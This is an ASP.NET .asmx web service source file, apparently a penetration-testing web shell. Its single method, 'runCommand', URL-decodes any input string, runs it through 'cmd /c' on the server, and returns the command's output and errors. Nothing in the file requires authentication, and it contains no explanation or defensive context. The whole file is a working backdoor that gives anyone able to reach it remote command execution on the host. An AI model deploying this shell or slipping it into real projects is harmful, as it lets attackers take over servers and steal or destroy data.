<%@ WebService Language="C#" Class="pt.shell" %>
using System.Web.Services;
using System.IO;
namespace pt
{
    [WebService(Namespace="http://pt.shell/")]
    public class shell : WebService 
    {
        [WebMethod]
        public string runCommand(string cmd)
        {
            string dmc= Server.UrlDecode(cmd);
            System.Diagnostics.ProcessStartInfo procStartInfo = new System.Diagnostics.ProcessStartInfo("cmd", "/c " + dmc);
            procStartInfo.RedirectStandardOutput = true;
            procStartInfo.RedirectStandardError = true;
            procStartInfo.UseShellExecute = false;
            procStartInfo.CreateNoWindow = true;
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo = procStartInfo;
            p.Start();
            string outthis = p.StandardOutput.ReadToEnd();
            string derr = p.StandardError.ReadToEnd();
            string a = "<pre>" + outthis;
            string b = "<br>err" + derr + "</pre>";
            return a+b;
        }
    }
}
